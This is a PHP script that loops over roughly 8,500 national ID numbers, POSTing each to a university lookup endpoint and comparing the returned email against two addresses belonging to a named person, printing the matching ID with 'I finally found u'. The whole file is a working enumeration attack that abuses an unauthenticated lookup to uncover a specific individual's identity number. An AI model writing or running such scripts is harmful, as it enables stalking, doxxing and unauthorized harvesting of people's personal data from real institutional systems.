<?php
ini_set('max_execution_time', 0);
set_time_limit(0);
$url = "http://desercion.uts.edu.co/docentes/funciones/buscar_id_academusoft.php";
$posibles_correos = array('juanjosesilva@uts.edu.co', 'juanjsilva@uts.edu.co');
for ($i=1005100000; $i < 1005108571 ; $i++) { 
	if (in_array(buscarAmigo($i, $url), $posibles_correos) ) {
		echo $i;
		echo "I finally found u";
	}
	
}
function buscarAmigo($cedula, $url)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "tipo=buscar_cedula&bus={$cedula}");
$result = curl_exec($ch);
$json = json_decode($result, true);
return $json['correo'];
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
}
?>